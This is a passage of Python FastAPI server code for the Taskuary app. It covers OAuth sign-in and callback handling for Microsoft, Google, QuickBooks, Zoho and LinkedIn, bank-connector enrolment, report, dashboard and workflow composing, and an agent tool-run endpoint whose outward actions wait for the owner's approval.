    store.save_connector({'ConnectorId': cid, 'ConfigJson': json.dumps(cfg), 'Secret': t['refresh_token'], 'Active': 1}, ACTOR)
    # the account signed in is what the card reads: its mailbox, or for a Teams card its chats (the UPN a source names)
    chan = 'teams' if kind == 'teams' else 'email'
    had = next((s for s in store.list_sources(active_only=False) if s['Channel'] == chan
                and (s['Address'] or '').lower() == (who['account'] or '').lower()), None) if who['account'] else None
    if who['account'] and not had:
        store.save_source({'Channel': chan, 'Address': who['account'], 'ConnectorId': cid, 'Active': 1}, ACTOR)
    # ...and one that exists but was SWITCHED OFF comes back on: signing in is asking for this mailbox to be read, and a stale
    # inactive row left it unread while the card said signed in (setup trace, 2026-10-14)
    # ...and so does one held by a card that reads nothing (the catalogue's first Teams card, no sign-in): it comes here
    elif had and (not had.get('Active') or (had.get('ConnectorId') != cid and not _reads(had.get('ConnectorId')))):
        store.save_source({**had, 'Active': 1, 'ConnectorId': cid}, ACTOR)
    # WHO YOU ARE, from the account you just signed in with - one step less for a first-time owner, never over a name they set
    if who.get('name') or who.get('account'):
        mine = store.owner() or {}
        if not mine.get('owner') or mine.get('owner') == 'the owner':
            try: put_owner(OwnerBody(name=who.get('name') or who['account'].split('@')[0], email=who.get('account') or None))
            except Exception as e: logger.debug(f'ms signin: the owner was not named from the account - {e}')
    store.audit('connector', cid, 'ms_signin', ACTOR, detail={'account': who['account']})
    from .docsync import sync_connections
    sync_connections(store, ACTOR)
    # signed in = connected: the first sync starts now, so mail is on the Timeline by the time
    # the card has finished saying "signed in" - not ten minutes later, or never until Sync now
    threading.Thread(target=_poll_reports, kwargs={'what': 'syncing'}, daemon=True).start()
    return {'status': 'ok', **who, 'syncing': True}

class GoogleFilesBody(BaseModel):
    on: bool = True


@app.post('/api/connectors/{cid}/google/files')
def google_files(cid: int, body: GoogleFilesBody):
    """Allow saving files on the Gmail card: where the browser goes to sign in again asking for drive.file as well (or, off, without
    it). The exchange happens on the way back (google_files_callback); the page gets only the link."""
    from . import fileaccess
    try: return {'url': fileaccess.google_url(store, cid, cfg['server'], body.on)}
    except LookupError as e: raise HTTPException(404, str(e))
    except ValueError as e: raise HTTPException(409, str(e))


@app.get('/api/google/files/callback', response_class=HTMLResponse)
def google_files_callback(code: str = None, state: str = '', error: str = None):
    """Google sends the browser back here. Outside the token gate like every OAuth return: it proves itself with the one-time state
    google_files issued, the refresh token never reaches a page, and the tab only says whether it worked (escaped, under a CSP)."""
    from html import escape as _esc
    from . import fileaccess
    ok, msg = fileaccess.google_callback(store, cfg['server'], code, state, error)
    return HTMLResponse(f'<!doctype html><meta charset=utf-8><title>Taskuary</title><body style="font:15px system-ui;padding:40px;color:#262521;background:#f6f4f1">'
                        f'<p style="font-weight:700">{"Done" if ok else "Not changed"}</p><p>{_esc(str(msg))}</p><p style="color:#6e685f">You can close this tab and go back to Taskuary.</p>',
                        headers={'Content-Security-Policy': "default-src 'none'; style-src 'unsafe-inline'", 'Cache-Control': 'no-store'})


@app.get('/api/connectors/{cid}/ms/adminlink')
def ms_adminlink(cid: int):
    """The admin-approval link on demand - for the person who knows in advance that IT has to say yes."""
    from . import msauth
    c = _ms_card(cid)
    ccfg = json.loads(c.get('ConfigJson') or '{}')
    try: return {'url': msauth.admin_consent_url(ccfg, msauth.scopes_for(c['Type'], bool(ccfg.get('allow_files'))))}
    except RuntimeError as e: raise HTTPException(409, str(e))

@app.post('/api/connectors/{cid}/ms/signout')
def ms_signout(cid: int):
    """Forget the sign-in: the refresh token goes, the card turns off, admin fields stay."""
    c = store.get_connector(cid)
    if not c: raise HTTPException(404, 'connector not found')
    cfg = json.loads(c.get('ConfigJson') or '{}')
    for k in ('auth', 'account', 'name'): cfg.pop(k, None)
    from . import recentlydeleted                     # at once, with the page's Undo (recentlydeleted.py)
    out = recentlydeleted.sign_out(store, cid, c.get('Name') or c['Type'], cfg)
    store.audit('connector', cid, 'ms_signout', ACTOR, detail={'type': c['Type']})
    from .docsync import sync_connections
    sync_connections(store, ACTOR)
    return {'ok': True, **out}

@app.post('/api/platform/macos/open-settings')
def macos_open_settings(body: dict):
    """Open one of two System Settings panes the Apple Messages card walks the owner through.
    The pane is an enum mapped to a fixed URL on this side - the browser never sends a URL."""
    from . import imessage
    pane = (body or {}).get('pane')
    if pane not in imessage.PANES: raise HTTPException(422, f'unknown pane: {pane}')
    try: return imessage.open_settings(pane)
    except imessage.SetupError as e: return {'ok': False, 'detail': str(e), 'setup': e.setup}

@app.post('/api/platform/macos/probe')
def macos_probe(body: dict):
    """The Automation consent check: a non-sending Apple Event to Messages.app. Run only after
    the card has explained that macOS is about to ask - nothing is sent either way."""
    from . import imessage
    what = (body or {}).get('what')
    if what != 'messages_automation': raise HTTPException(422, f'unknown probe: {what}')
    try: return imessage.automation_probe()
    except imessage.SetupError as e: return {'ok': False, 'detail': str(e), 'setup': e.setup}
    except Exception as e: return {'ok': False, 'detail': str(e)[:500]}

@app.post('/api/tools/run')
def tool_run(body: dict, request: Request):
    """The agents' hands on your other systems: run ONE query/script through a connection
    the owner marked as a tool, and get the raw output back (no AI pass, no timeline row).
    Same executors the Reports tab uses, same saved credentials - so an agent working a
    task can look something up in SQL Server, run a script on a box, or call an MCP tool.
    Catalog cards exist from first launch (winrm/mssql already have the tool role in
    DEFAULT_ROLES) even when the owner never connected them - off means off. A connection
    without the 'tool' role also refuses, and so does one whose Authority sits below what
    the executor needs - running PowerShell on a box is 'admin', reading a table is 'read'."""
    t = (body or {}).get('type')
    if t not in REGISTRY: raise HTTPException(422, f'unknown tool type: {t}')
    from .reports import card_of, query_only
    from . import scopes
    connector_id = (body or {}).get('connector_id')
    try: conn = store.get_connector(int(connector_id)) if connector_id else store.get_connector_by_type(card_of(t))
    except (TypeError, ValueError): raise HTTPException(422, 'connector_id must be a number')
    if conn and conn.get('Type') != card_of(t):
        raise HTTPException(422, f'connector {connector_id} is {conn.get("Type")}, not {card_of(t)}')
    if not conn:
        # no card is not 'nothing to check' - it is nothing the owner ever switched on. Types with no
        # card (sqlite, local_file, agent, rest) used to run for anyone holding the API: any file on
        # disk, any database, another agent run (audit 2026-09-02)
        raise HTTPException(403, f'{t} has no connection card an owner turned on - it is not an agent tool')
    if not conn.get('Active'):
        raise HTTPException(403, f"the {t} connection is off - turn it on under {words.name('connections')}")
    if 'tool' not in store_mod.roles_of(conn):
        raise HTTPException(403, f'the {t} connection is not marked as an agent tool ({words.card(t)} → Role)')
    hub_tools = {'handbook_search', 'handbook_write', 'handbook_vote',
                 'hub_search', 'hub_write', 'hub_vote', 'hub_comment'}
    actor = _hub_actor(request, (body or {}).get('author')) if t in hub_tools else ACTOR
    # AN AGENT NEVER SENDS FROM HERE (the owner, 2026-10-25): a post, an invoice sent, an order, an MCP tool its server does not call
    # read-only - each waits as a proposal on the agent's own task, at any Authority, and the owner's press runs it. Before the scope
    # check on purpose: at read, the proposal was always the road, and the refusal only said so.
    if guard.scope_of(cfg['server'], request.headers) == guard.AGENT:
        tool = _mcp_tool(conn, body) if t == 'mcp' else None
        if why := scopes.reaches(t, body, tool): return _agent_proposes(request, t, conn, body, why)
    try:
        scopes.require(conn, t)
    except PermissionError as e:
        store.audit('tool', conn['ConnectorId'], 'run_refused', actor, detail={'type': t, 'scope': scopes.scope_of(conn)})
        raise HTTPException(403, str(e))
    try:
        # the body says WHAT to run, never WHERE: a base_url/account/server in it used to override the
        # card's, sending the card's token to a host of the caller's choosing (reports.query_only)
        # ...and the card checked above is the card that runs: query_only drops connector_id, which fell back to the first of the type
        tool_cfg = {**query_only(body), 'type': t, 'connector_id': conn['ConnectorId']}
        # SQL commits only on a card the owner raised to write; at read, the batch is rolled back (mssql.run_query)
        if t in ('mssql', 'database'): tool_cfg['_write'] = scopes.rank(scopes.scope_of(conn)) >= scopes.rank('write')
        if t in hub_tools:
            # The token decides who spoke. A tool payload cannot claim to be the owner or
            # another agent, even though the executor accepts an author for internal calls.
            tool_cfg['author'] = actor
        head, out = REGISTRY[t](resolve_cfg(store, tool_cfg))
    except Exception as e:
        store.audit('tool', (conn or {}).get('ConnectorId', 0), 'run_failed', actor, detail={'type': t, 'error': str(e)[:300]})
        return {'ok': False, 'error': str(e)[:1000]}
    store.audit('tool', (conn or {}).get('ConnectorId', 0), 'run', actor, detail={'type': t, 'headline': str(head)[:200]})
    return {'ok': True, 'headline': head, 'output': (out or '')[:20000]}

def _mcp_tool(conn, body):
    """The MCP tool an agent named, as its own server describes it - None when the server cannot be asked or does not list it, which
    scopes.reaches reads as "not read-only": a tool that cannot say what it is waits for the owner."""
    from .mcp import list_tools
    from .reports import query_only, resolve_cfg
    try: hit = next((x for x in list_tools(resolve_cfg(store, {**query_only(body), 'type': 'mcp', 'connector_id': conn['ConnectorId']}))
                     if x['name'] == (body or {}).get('tool')), None)
    except Exception as e:
        logger.info(f'mcp tool list for an agent call failed ({e}) - it waits for the owner'); return None
    return {'annotations': {'readOnlyHint': True}} if hit and hit.get('read_only') else None

# what an agent may not put on a proposal: where it runs is the card's, and a workflow's own resume or a close-out is Taskuary's
_NOT_PROPOSED = ('task_id', 'why', 'action', 'flow_run', 'closeout', '_write')

def _agent_proposes(request: Request, t: str, conn: dict, body: dict, why: str):
    """An agent's call that would reach a person, filed as a run_tool proposal on its OWN task (proposals.queue): 202 with the review
    the owner presses. Nothing ran. No task named is a refusal that says how, never a silent drop."""
    from . import proposals
    from .reports import query_only
    tid = (body or {}).get('task_id')
    if not str(tid or '').isdigit():
        raise HTTPException(422, f"this {why} - so it waits for the owner's press on your task. Send task_id ($TASKUARY_TASK) with "
                                 'the call and it is filed there as a proposal; nothing is sent until they press Approve.')
    tid = int(tid)
    _own_task_only(request, tid)
    if not store.get_task(tid): raise HTTPException(404, 'no such task')
    p = {**{k: v for k, v in query_only(body).items() if k not in _NOT_PROPOSED},
         'action': 'run_tool', 'type': t, 'connector_id': conn['ConnectorId'], 'why': str((body or {}).get('why') or '')[:300]}
    q = proposals.queue(store, tid, p, 'agent')
    if not q: raise HTTPException(403, 'the proposal was refused - the reason is on the task')
    store.audit('tool', conn['ConnectorId'], 'run_proposed', 'agent', detail={'type': t, 'task': tid, 'review': q['reviewId']})
    return JSONResponse({'ok': True, 'queued': True, 'review': q['reviewId'],
                         'says': f"Waiting on the owner's press: this {why}. Nothing was sent; it runs only when they press Approve."},
                        status_code=202)

@app.post('/api/reports/compose')
def report_compose(body: dict):
    """Say what you want in English; get a report config back, or the questions that stand
    between here and one. Nothing is saved - the answer goes into the same builder the owner
    would have filled in by hand, and Preview runs it for real before anything is scheduled."""
    from .compose import compose
    out = compose(store, (body or {}).get('ask') or '', _llm(), (body or {}).get('answers'),
                  exclude_types=('zoho_monthly_invoices',))
    if out.get('config'):
        store.audit('report', 0, 'compose', ACTOR, detail={'ask': ((body or {}).get('ask') or '')[:300],
                                                           'type': out['config'].get('type'),
                                                           'confidence': out.get('confidence')})
    return out


# ── DASHBOARDS (dashboards.py): a report you look at - set up with AI like one, run with none ──
@app.post('/api/dashboards/compose')
def dashboard_compose(body: dict):
    """Say what you want to see; get a dashboard spec (sources + preset components) back, or the questions first. Nothing is
    saved - the page previews it over real rows and the owner saves it."""
    from .compose import compose_dashboard
    out = compose_dashboard(store, (body or {}).get('ask') or '', _llm(), (body or {}).get('answers'))
    if out.get('config'):
        store.audit('report', 0, 'compose_dashboard', ACTOR, detail={'ask': ((body or {}).get('ask') or '')[:300], 'confidence': out.get('confidence')})
    return out

@app.post('/api/dashboards/preview')
def dashboard_preview(body: dict):
    """Run a spec's sources for real, without saving it: the rows the page draws, and what would draw empty."""
    from . import dashboards
    spec = (body or {}).get('config') or {}
    ok, why = dashboards.validate(spec, store)
    if not ok: raise HTTPException(422, why)
    data = dashboards.collect(store, spec)
    return {'data': data, 'problems': dashboards.problems(spec, data)}

@app.get('/api/dashboards/templates')
def dashboard_templates():
    """The built-in dashboards New dashboard offers in one press (dashboards.TEMPLATES) - what the End of day checkup is to reports."""
    from . import dashboards
    return {'templates': dashboards.templates()}

@app.get('/api/dashboards/templates/{key}')
def dashboard_template(key: str):
    """One built-in dashboard, drawn over this install's own rows: its sources are Taskuary's tables, read locally and deterministically,
    so it is shown at once (a GET - the demo shows it too) and saved like any draft."""
    from . import dashboards
    t = dashboards.template(key)
    if not t: raise HTTPException(404, 'no such dashboard template')
    data = dashboards.collect(store, t['config'])
    return {**t, 'data': data, 'problems': dashboards.problems(t['config'], data)}

@app.get('/api/dashboards/{sid}')
def dashboard_get(sid: int):
    """A saved dashboard: its spec, its last run's rows (None before the first run) and what would draw empty."""
    from . import dashboards
    src = store.get_source(sid)
    cfg = dashboards.cfg_of(src)
    if not src or not dashboards.is_dashboard(cfg): raise HTTPException(404, 'dashboard not found')
    data = dashboards.last(store, sid)
    return {'source_id': sid, 'active': bool(src.get('Active')), 'config': cfg, 'data': data,
            'problems': dashboards.problems(cfg, data) if data else []}


@app.get('/api/workflows')
def workflows_catalog():
    """Configured workflows and request procedures, read apart (PW-203/207): a job the owner scheduled is not
    a playbook, and a playbook is not a scheduled job."""
    from . import workflows
    return workflows.catalog(store)

@app.get('/api/workflows/brain')
def workflow_brain():
    """The workflow editor's Model and Effort: the general agents' brain a blank runs on, its models, and only the efforts each takes."""
    from . import workflows
    return workflows.brain_options(store)

@app.post('/api/workflows/compose')
def workflow_compose(body: dict):
    """Describe a stateful invoice or scheduled AI-agent workflow; return an editable draft."""
    from .compose import compose_workflow
    out = compose_workflow(store, (body or {}).get('ask') or '', _llm(), (body or {}).get('answers'))
    if out.get('config'):
        store.audit('workflow', 0, 'compose', ACTOR,
                    detail={'ask': ((body or {}).get('ask') or '')[:300],
                            'type': out['config'].get('type'), 'confidence': out.get('confidence')})
    return out

@app.post('/api/workflows/step-test')
def workflow_step_test(body: dict):
    """Run ONE step with the outputs the page already has for the steps above it (n8n's "execute node"): testing step 4 never
    re-runs the writes in steps 1-3. Reads and AI steps run for real, through the same switch and scope checks as a scheduled run;
    a task, a draft, an agent hand-off and a write come back `dry` - what it WOULD do, rendered."""
    from . import flow, workflows
    b = body or {}
    steps, i = b.get('flow') or [], b.get('index')
    if not isinstance(steps, list) or not isinstance(i, int) or not 0 <= i < len(steps): raise HTTPException(422, 'say which step to test')
    src = store.get_source(int(b['source_id'])) if str(b.get('source_id') or '').isdigit() else None
    cfg = {**(workflows.cfg_of(src) if src else {}), 'title': b.get('title') or '', 'inputs': b.get('inputs') or {}, 'flow': steps}
    ctx = flow.context(cfg, 'manual', (src or {}).get('SourceId'))
    outs = b.get('outputs') or {}
    for s in steps[:i]:
        if isinstance(outs.get(s.get('id')), dict): flow._add(ctx, s, {**outs[s['id']], 'id': s['id']})
    step = steps[i]
    llm = _llm() if step.get('kind') == 'ai' else None
    return flow.run_step(store, step, ctx, llm, None, dry=True, title=cfg['title'],
                         src=src or {'ConfigJson': json.dumps(cfg)}, recs=[outs[s['id']] for s in steps[:i] if isinstance(outs.get(s.get('id')), dict)])

@app.post('/api/workflows/{sid}/repair')
def workflow_repair(sid: int, body: dict = None):
    """Fix with AI: one composer round over a failed run's failed step, peeking at the real schema. Returns {flow, explain, diff}
    for the editor to show as an unsaved change - nothing is kept until the owner saves it."""
    from . import flow, workflows
    src = store.get_source(sid)
    if not src: raise HTTPException(404, 'workflow not found')
    b = body or {}
    run = store.get_report_run(int(b['run_id'])) if str(b.get('run_id') or '').isdigit() else None
    if not run or run.get('sourceId') != sid: raise HTTPException(404, 'that run is not one of this workflow\'s')
    cfg = workflows.cfg_of(src)
    if isinstance(b.get('flow'), list) and b['flow']: cfg = {**cfg, 'flow': b['flow']}     # the editor's own unsaved list
    out = flow.repair(store, cfg, run, _llm(), sid)
    if out.get('flow'): store.audit('workflow', sid, 'repair_drafted', ACTOR, detail={'run': run['runId'], 'explain': out.get('explain')})
    return out

# ── QuickBooks Online (quickbooks.py): OAuth against Intuit, with a redirect back to this server ──
@app.get('/api/connectors/{cid}/quickbooks/status')
def quickbooks_status(cid: int):
    """What the card needs to draw its Connect box: the redirect URI the Intuit app must carry,
    whether a token is on the card, and which company it is for."""
    from . import quickbooks as qb
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'quickbooks': raise HTTPException(404, 'not a QuickBooks connector')
    conf = json.loads(c.get('ConfigJson') or '{}')
    return {'redirect_uri': qb.redirect_uri(cfg['server']), 'connected': bool(c.get('Secret')),
            'realm_id': conf.get('realm_id') or '', 'env': conf.get('env') or 'production', 'has_app': bool(conf.get('client_id') and conf.get('client_secret'))}

@app.get('/api/connectors/{cid}/quickbooks/authorize')
def quickbooks_authorize(cid: int):
    """Where the browser goes to say yes. The state carries the connector id back."""
    from . import quickbooks as qb
    c = store.get_connector(cid)
    if not c or c['Type'] != 'quickbooks': raise HTTPException(404, 'not a QuickBooks connector')
    nonce = secrets.token_urlsafe(16); _QB_STATES[cid] = (nonce, time.time())
    try: return {'url': qb.authorize_url(json.loads(c.get('ConfigJson') or '{}'), qb.redirect_uri(cfg['server']), f'tq-{cid}-{nonce}')}
    except qb.QuickBooksError as e: raise HTTPException(409, str(e))

_QB_STATES = {}      # connector id -> (nonce, issued at): a callback must answer a Connect we actually started

@app.get('/api/quickbooks/callback', response_class=HTMLResponse)
def quickbooks_callback(code: str = None, state: str = '', realmId: str = None, error: str = None):
    """Intuit sends the browser back here with the code and the company id. The exchange happens
    server-side and the refresh token never reaches the page; the tab just says it worked."""
    from . import quickbooks as qb
    # this page is outside the token gate (Intuit redirects to it), and it echoes what the query
    # string said: escaped, and under a CSP, or a crafted link ran script on the origin that holds
    # the API token (audit 2026-09-02)
    from html import escape as _esc
    csp = {'Content-Security-Policy': "default-src 'none'; style-src 'unsafe-inline'"}
    page = lambda msg, ok=True: HTMLResponse(f'<!doctype html><meta charset=utf-8><title>Taskuary</title><body style="font:15px system-ui;padding:40px;color:#262521;background:#f6f4f1">'
                                             f'<p style="font-weight:700">{"Connected" if ok else "Not connected"}</p><p>{_esc(str(msg))}</p><p style="color:#6e685f">You can close this tab and go back to Taskuary.</p>', headers=csp)
    if error: return page(f'Intuit said: {error}', False)
    if not (code and state.startswith('tq-') and realmId): return page('the callback came back without a code or a company id', False)
    try: cid, nonce = int(state.split('-')[1]), state.split('-', 2)[2]
    except (ValueError, IndexError): return page('bad state', False)
    issued = _QB_STATES.pop(cid, None)
    if not issued or issued[0] != nonce or time.time() - issued[1] > 900: return page('this Connect link is not one Taskuary issued in the last 15 minutes - press Connect on the card again', False)
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'quickbooks': return page('no such QuickBooks card', False)
    try:
        conf = qb.connection(store, cid)
        qb.exchange_code(conf, code, qb.redirect_uri(cfg['server']), realmId)
        store.save_connector({'ConnectorId': cid, 'Active': True}, ACTOR)
        store.audit('connector', cid, 'quickbooks_connected', ACTOR, detail={'realm_id': realmId})
    except Exception as e: return page(str(e)[:300], False)
    return page(f'QuickBooks company {realmId} is connected to the {c["Name"]} card. Press Test there to read the company name.')

# Zoho Invoice uses the same local OAuth shape as QuickBooks, but a token can see multiple
# organizations. Connect selects the first one; the organization id remains editable on the card.
_ZOHO_STATES = {}

@app.get('/api/connectors/{cid}/zoho/status')
def zoho_status(cid: int):
    from . import zoho
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'zoho_invoice': raise HTTPException(404, 'not a Zoho Invoice connector')
    conf = json.loads(c.get('ConfigJson') or '{}')
    return {'redirect_uri': zoho.redirect_uri(cfg['server']), 'connected': bool(c.get('Secret')),
            'organization_id': conf.get('organization_id') or '',
            'organization_name': conf.get('organization_name') or '',
            'has_app': bool(conf.get('client_id') and conf.get('client_secret'))}

@app.get('/api/connectors/{cid}/zoho/authorize')
def zoho_authorize(cid: int):
    from . import zoho
    c = store.get_connector(cid)
    if not c or c['Type'] != 'zoho_invoice': raise HTTPException(404, 'not a Zoho Invoice connector')
    nonce = secrets.token_urlsafe(16); _ZOHO_STATES[cid] = (nonce, time.time())
    try: return {'url': zoho.authorize_url(json.loads(c.get('ConfigJson') or '{}'), zoho.redirect_uri(cfg['server']), f'tq-{cid}-{nonce}')}
    except zoho.ZohoError as e: raise HTTPException(409, str(e))

@app.get('/api/zoho/callback', response_class=HTMLResponse)
def zoho_callback(code: str = None, state: str = '', error: str = None):
    from . import zoho
    from html import escape as _esc
    csp = {'Content-Security-Policy': "default-src 'none'; style-src 'unsafe-inline'"}
    page = lambda msg, ok=True: HTMLResponse(f'<!doctype html><meta charset=utf-8><title>Taskuary</title><body style="font:15px system-ui;padding:40px;color:#262521;background:#f6f4f1">'
        f'<p style="font-weight:700">{"Connected" if ok else "Not connected"}</p><p>{_esc(str(msg))}</p><p style="color:#6e685f">You can close this tab and go back to Taskuary.</p>', headers=csp)
    if error: return page(f'Zoho said: {error}', False)
    if not (code and state.startswith('tq-')): return page('the callback came back without a code', False)
    try: cid, nonce = int(state.split('-')[1]), state.split('-', 2)[2]
    except (ValueError, IndexError): return page('bad state', False)
    issued = _ZOHO_STATES.pop(cid, None)
    if not issued or issued[0] != nonce or time.time() - issued[1] > 900:
        return page('this Connect link expired; press Connect on the Zoho card again', False)
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'zoho_invoice': return page('no such Zoho Invoice card', False)
    try:
        conf = zoho.connection(store, cid)
        zoho.exchange_code(conf, code, zoho.redirect_uri(cfg['server']))
        orgs = zoho.organizations(conf)
        if not orgs: raise RuntimeError('the account returned no Zoho Invoice organizations')
        first = orgs[0]
        zoho._save(conf, organization_id=str(first.get('organization_id')), organization_name=first.get('name'))
        store.save_connector({'ConnectorId': cid, 'Active': True}, ACTOR)
        store.audit('connector', cid, 'zoho_connected', ACTOR, detail={'organization_id': first.get('organization_id')})
    except Exception as e: return page(str(e)[:300], False)
    return page(f'Zoho Invoice organization {first.get("name") or first.get("organization_id")} is connected. Press Test on the card to verify it.')

# LinkedIn takes the same local OAuth road as QuickBooks and Zoho. What differs is the end of it:
# there is no company or organization to choose, and the token that arrives IS the card's secret
# rather than a refresh token, because LinkedIn grants refresh tokens only to approved apps.
_LI_STATES = {}

@app.get('/api/connectors/{cid}/linkedin/status')
def linkedin_status(cid: int):
    from . import linkedin
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'linkedin': raise HTTPException(404, 'not a LinkedIn connector')
    conf = json.loads(c.get('ConfigJson') or '{}')
    return {'redirect_uri': linkedin.redirect_uri(cfg['server']), 'connected': bool(c.get('Secret')),
            'has_app': bool(conf.get('client_id') and conf.get('client_secret')),
            'member': conf.get('member_name') or '', 'days_left': linkedin.days_left(conf)}

@app.get('/api/connectors/{cid}/linkedin/authorize')
def linkedin_authorize(cid: int):
    from . import linkedin
    c = store.get_connector(cid)
    if not c or c['Type'] != 'linkedin': raise HTTPException(404, 'not a LinkedIn connector')
    nonce = secrets.token_urlsafe(16); _LI_STATES[cid] = (nonce, time.time())
    try: return {'url': linkedin.authorize_url(json.loads(c.get('ConfigJson') or '{}'),
                                               linkedin.redirect_uri(cfg['server']), f'tq-{cid}-{nonce}')}
    except linkedin.LinkedInError as e: raise HTTPException(409, str(e))

@app.get('/api/linkedin/callback', response_class=HTMLResponse)
def linkedin_callback(code: str = None, state: str = '', error: str = None,
                      error_description: str = None):
    from . import linkedin
    from html import escape as _esc
    csp = {'Content-Security-Policy': "default-src 'none'; style-src 'unsafe-inline'"}
    page = lambda msg, ok=True: HTMLResponse(f'<!doctype html><meta charset=utf-8><title>Taskuary</title><body style="font:15px system-ui;padding:40px;color:#262521;background:#f6f4f1">'
        f'<p style="font-weight:700">{"Connected" if ok else "Not connected"}</p><p>{_esc(str(msg))}</p><p style="color:#6e685f">You can close this tab and go back to Taskuary.</p>', headers=csp)
    if error:
        said = error_description or error
        hint = linkedin.missing_product_hint(said)
        return page(f'LinkedIn said: {said}' + (f' -- {hint}' if hint else ''), False)
    if not (code and state.startswith('tq-')): return page('the callback came back without a code', False)
    try: cid, nonce = int(state.split('-')[1]), state.split('-', 2)[2]
    except (ValueError, IndexError): return page('bad state', False)
    issued = _LI_STATES.pop(cid, None)
    if not issued or issued[0] != nonce or time.time() - issued[1] > 900:
        return page('this Connect link expired; press Connect on the LinkedIn card again', False)
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'linkedin': return page('no such LinkedIn card', False)
    try:
        conf = linkedin.connection(store, cid)
        linkedin.exchange_code(conf, code, linkedin.redirect_uri(cfg['server']))
        # name the member on the card straight away: "Connected" over a card that cannot say WHO
        # is connected is the failure mode of every OAuth button
        me = linkedin.whoami(conf)
        linkedin._save(conf, member_name=me.get('name') or '', member_urn=me.get('author') or '')
        store.save_connector({'ConnectorId': cid, 'Active': True}, ACTOR)
        store.audit('connector', cid, 'linkedin_connected', ACTOR, detail={'member': me.get('name') or ''})
    except Exception as e: return page(str(e)[:300], False)
    left = linkedin.days_left(json.loads((store.get_connector(cid) or {}).get('ConfigJson') or '{}'))
    return page(f'{me.get("name") or "Your LinkedIn account"} is connected'
                + (f' - the token lasts {left} more days' if left else '')
                + '. Press Test on the card to verify it.')

@app.get('/api/connectors/{cid}/zoho/customers')
def zoho_customers(cid: int):
    from . import scopes, zoho
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'zoho_invoice': raise HTTPException(404, 'not a Zoho Invoice connector')
    try:
        scopes.require(c, 'zoho_customers')
        return {'data': zoho.customers(zoho.connection(store, cid))}
    except Exception as e: raise HTTPException(422, str(e)[:500])

# ── Teller (teller.py): the card runs Teller Connect in the browser; the token it hands back lands here ──
class TellerEnrollBody(BaseModel): access_token: str; enrollment_id: str | None = None; institution: str | None = None

@app.get('/api/connectors/{cid}/teller/status')
def teller_status(cid: int):
    from .teller import CONNECT_JS
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'teller': raise HTTPException(404, 'not a Teller connector')
    conf = json.loads(c.get('ConfigJson') or '{}')
    return {'has_app': bool(conf.get('application_id')), 'connected': bool(c.get('Secret')), 'environment': conf.get('environment') or 'sandbox',
            'institution': conf.get('institution') or '', 'application_id': conf.get('application_id') or '', 'connect_js': CONNECT_JS}

@app.post('/api/connectors/{cid}/teller/enroll')
def teller_enroll(cid: int, body: TellerEnrollBody):
    """Teller Connect finished in the owner's browser: keep the access token (write-only) and name the
    bank on the card. The token never shows again; Test proves it works."""
    c = store.get_connector(cid)
    if not c or c['Type'] != 'teller': raise HTTPException(404, 'not a Teller connector')
    if not body.access_token.strip(): raise HTTPException(422, 'no access token in the enrolment')
    conf = json.loads(c.get('ConfigJson') or '{}')
    conf.update({k: v for k, v in (('enrollment_id', body.enrollment_id), ('institution', body.institution)) if v})
    store.save_connector({'ConnectorId': cid, 'Secret': body.access_token.strip(), 'ConfigJson': json.dumps(conf), 'Active': True}, ACTOR)
    store.audit('connector', cid, 'teller_enrolled', ACTOR, detail={'institution': body.institution or ''})
    return {'ok': True}

# ── SimpleFIN (simplefin.py): the owner pastes a setup token; the server spends it, once ──
class SimpleFinClaimBody(BaseModel): setup_token: str

@app.get('/api/connectors/{cid}/simplefin/status')
def simplefin_status(cid: int):
    """Nothing has to be saved before connecting - there is no application to register and no
    certificate, so `has_app` is true from the start. `connected` is whether the access URL is on
    the card."""
    from .simplefin import BRIDGE, budget
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'simplefin': raise HTTPException(404, 'not a SimpleFIN connector')
    conf = json.loads(c.get('ConfigJson') or '{}')
    return {'has_app': True, 'connected': bool(c.get('Secret')), 'bridge': BRIDGE,
            'institution': conf.get('institution') or '', 'reads_today': budget()}

@app.post('/api/connectors/{cid}/simplefin/claim')
def simplefin_claim(cid: int, body: SimpleFinClaimBody):
    """Trade the setup token for the access URL and keep only the URL (write-only).

    The token is SPENT by this call - SimpleFIN answers a second claim with "Forbidden" - so the
    422s below matter: a mistyped token must fail before it is thrown away, and a token that was
    already claimed must say so in those words rather than looking like a network fault. The
    access URL carries its own basic-auth credentials, which is why it never comes back out."""
    from .simplefin import SimpleFinError, claim, claim_url
    c = store.get_connector(cid)
    if not c or c['Type'] != 'simplefin': raise HTTPException(404, 'not a SimpleFIN connector')
    try: claim_url(body.setup_token)                       # decodes, or 422 with the reason
    except ValueError as e: raise HTTPException(422, str(e)) from e
    try: access = claim(body.setup_token)
    except SimpleFinError as e: raise HTTPException(422, str(e)) from e
    store.save_connector({'ConnectorId': cid, 'Secret': access, 'Active': True}, ACTOR)
    store.audit('connector', cid, 'simplefin_claimed', ACTOR, detail={'host': access.split('@')[-1].split('/')[0]})
    return {'ok': True}

@app.get('/api/intacct/fields')
def intacct_object_fields(obj: str, connector_id: int = None):
    """What this company's copy of an Intacct object actually carries, custom fields and all.

    "I don't know what fields off hand Intacct has set up" is not a question anybody should answer
    from memory - Sage knows, the lookup call is cheap, and a hardcoded field list is wrong the day
    somebody adds a field. The source card asks this and the owner clicks the ones they want."""
    from .intacct import fields_of
    from .reports import intacct_connection
    try: return {'ok': True, 'data': fields_of(intacct_connection(store, connector_id), (obj or '').strip())}
    except Exception as e: return {'ok': False, 'error': str(e)[:500]}

@app.post('/api/reports/compose-sources')
def report_compose_sources(body: dict):
    """Say what a check should READ; get the source cards back. The step below /compose: no title,
    no schedule, just the part of the form that needs knowing an object name or a field id.

    This is what the Assistant's Pipeline step calls - and what a single source card calls with its
    own type in `type`, so "AP bills due in the next 30 days" comes back as the object, the fields
    this company's Intacct actually has, and the filter."""
    from .compose import compose_sources
    b = body or {}
    out = compose_sources(store, b.get('ask') or '', _llm(), (b.get('type') or '').strip() or None, b.get('answers'))
    if out.get('sources'):
        store.audit('report', 0, 'compose_sources', ACTOR,
                    detail={'ask': (b.get('ask') or '')[:300], 'confidence': out.get('confidence'),
